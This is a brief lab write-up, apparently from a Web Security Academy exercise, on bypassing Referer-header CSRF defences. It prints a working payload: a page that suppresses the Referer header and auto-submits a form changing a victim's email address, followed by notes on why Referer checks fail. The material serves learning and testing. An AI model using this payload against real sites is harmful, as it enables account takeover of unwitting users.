# CSRF Vulnerability - Double Submit
# CSRF Vulnerability - Referer Header


## Let generate some Payloads!

```php
<meta name="referrer" content="never">
<form method="POST" action="X.web-security-academy.net/my-account/change-email">
	<input type="text" name="email" value="test@gmail.com">
</form>
<script>
	document.forms[0].submit();
</script>
```

## Takeaway


- some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. (less effective and is often subject to bypasses.)

- Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.

- Droppding the ```Referer Header``` using:

```php
<meta name="referrer" content="never">
```
